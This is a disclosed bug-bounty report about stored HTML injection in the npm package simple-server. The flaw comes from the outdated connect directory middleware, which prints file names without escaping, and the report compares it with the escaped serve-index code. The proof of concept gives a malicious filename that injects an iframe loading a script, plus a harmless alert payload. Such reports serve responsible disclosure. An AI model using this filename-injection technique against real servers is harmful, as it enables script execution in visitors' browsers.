# [simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript 

## Report Details
- **Report ID**: 309641
- **URL**: https://hackerone.com/reports/309641
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-01-26T21:38:57.170Z
- **Disclosed**: 2018-03-01T23:04:03.545Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

**simple-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript. This is caused by outdated version of ```connect``` framework.

**Module:** 

Simple Server allows you to easily get a node.js static file server up and running anywhere anytime.

https://www.npmjs.com/package/simple-server

**Description**

This issue is exactly the same I've reported for ```anywhere``` module (https://hackerone.com/reports/309394).
The problem is outdated ```connect``` framework (2.10.0) with obsolete middleware used to display content of the directory as HTML.

This is the code which allows to embed HTML in file names and execute attack described in PoC (```/node_modules/connect/lib/middleware/directory.js```, lines 192-197):

```javascript

    return '<li><a href="'
      + utils.normalizeSlashes(normalize(path.join('/')))
      + '" class="'
      + classes.join(' ') + '"'
      + ' title="' + file + '">'
      + icon + file + '</a></li>';
```

As you can see, ```file``` is output directly into HTML without any sanitization.

Now, take a look how the same fragment of code looks in ```serve-index``` middleware, introduced in place of old middlewares like ```directory.js``` above, and  used in current Connect and Express frameworks (https://github.com/expressjs/serve-index/blob/a399faa1801f02ee1885e5664ed21a9c7990b63a/index.js#L279):

```javascript
return '<li><a href="'
      + escapeHtml(normalizeSlashes(normalize(path.join('/'))))
      + '" class="' + escapeHtml(classes.join(' ')) + '"'
      + ' title="' + escapeHtml(file.name) + '">'
      + '<span class="name">' + escapeHtml(file.name) + '</span>'
      + '<span class="size">' + escapeHtml(size) + '</span>'
      + '<span class="date">' + escapeHtml(date) + '</span>'
      + '</a></li>';
```

All output data is sanitized with ```escapeHtml()``` which sanitizes HTML before is send to browser.

I think this is the problem of all older npm modules using old versions of Connect middlewares like ```directory.js```.


## PoC - Steps To Reproduce:

In the directory which will be served via ```simple-server```, create file with following name:

```
"><iframe src="malware_frame.html">
```

Then, HTML file with following content have to be saved in the same directory as file with the name changed:

```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="malware.js"></script>
</body>

</html>
```

An ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.
On my local machine, ```malware.js``` has following content:

```
alert('Uh oh, I am very bad malware!')
```

Run ```simple-server`` in directory where both file with filename changed and ```malware_frame.html``` are saved:

```
$ ./node_modules/simple-server/bin/simple-server.js ./ 8080
Simple-Server listening to http://:::8080/ with directory /Users/bl4de/playground/node_bugbounty_playground
```

and open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed.

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Exploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```simple-server``` is used to serve static content.

## Attachments
No attachments
